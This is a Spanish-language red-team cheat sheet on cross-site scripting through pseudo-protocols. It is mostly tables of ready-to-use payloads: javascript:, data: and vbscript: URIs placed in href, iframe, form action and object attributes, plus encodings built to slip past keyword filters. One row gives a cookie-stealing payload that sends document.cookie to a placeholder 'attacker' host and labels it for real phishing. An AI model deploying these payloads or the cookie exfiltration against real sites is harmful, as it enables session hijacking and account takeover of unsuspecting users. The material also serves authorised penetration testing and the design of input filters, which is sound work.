---
aliases:
tags:
  - vuln/xss
  - technique/execution
  - asset/web-app
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Explotación]]"
  - "[[Web]]"
tertiary categories:
  - "[[Web Explotación]]"
kind: SubCheatSheet
linked:
  - "[[Cross-Site Scripting (XSS)]]"
---
# XSS - Pseudo-protocolos (`javascript:`)

---

## Cheatsheet

| **Payload** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `javascript:alert(1)` | Inyección directa en `href`/`src`/`action` cuando controlás todo el value | Reflejo en `<a href="INYECCIÓN">`. |
| `javascript:fetch('//attacker/?c='+document.cookie)` | Cookie exfil al click | Phishing real desde XSS. |
| `data:text/html,<script>alert(1)</script>` | Data URI con HTML embebido | `src` de `<iframe>`/`<object>` permite `data:`. |
| `data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==` | Data URI base64 — bypassea filtros de keyword | Filtro busca `<script>` literal en URL. |
| `vbscript:msgbox(1)` | XSS en IE legacy | Targets con IE — raro pero existe. |
^xss-pseudo

### Por vector de inyección

| **Payload** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `<a href="javascript:alert(1)">click</a>` | Click → ejecuta | Anchor con `href` user-controlled. |
| `<iframe src="javascript:alert(1)">` | Auto-ejecución al renderizar iframe | Inyección de tag iframe. |
| `<form action="javascript:alert(1)"><button>submit</button></form>` | Submit → ejecuta | Inyección en `action` de form. |
| `<button formaction="javascript:alert(1)">click</button>` | Click → ejecuta, override form action | HTML5 `formaction`. |
| `<object data="javascript:alert(1)">` | Auto-ejecución | Edge — depende de browser. |
^xss-pseudo-vectors

### Bypass de filtros léxicos

| **Payload** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `java&#x09;script:alert(1)` | Tab entity dentro del scheme | Filtro busca `javascript:` literal. |
| `java%0Ascript:alert(1)` | Newline URL-encoded en scheme | Mismo principio. |
| `&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;:alert(1)` | HTML entities encode de `javascript` | Atributos decodifican entities pre-URL-parse. |
| `javascript:%61%6c%65%72%74%28%31%29` | URL encode del payload JS post-scheme | Filtros buscan `alert(`. |
| `JaVaScRiPt:alert(1)` | Mixed-case en scheme | Regex case-sensitive. |
| `\tjavascript:alert(1)` | Whitespace literal antes del scheme | Algunos browsers toleran leading whitespace. |
^xss-pseudo-bypass

---

## Overview

`javascript:` URI permite ejecutar JS cuando se aterriza en atributos URL (`href`/`src`/`action`/`formaction`). Browser interpreta el scheme como código en vez de navegación.

**Crítico cuando:**
- `<script>` filtrado.
- Event handlers `on*` bloqueados.
- App permite "URLs personalizadas" para profile/links sin validar scheme.

**Limitación clave:** `javascript:` debe estar al inicio absoluto del value. Si app prefija con path (`<a href="/redirect/INYECCIÓN">`), no funciona — hay que escapar comillas primero o pivotar a otro vector.

---
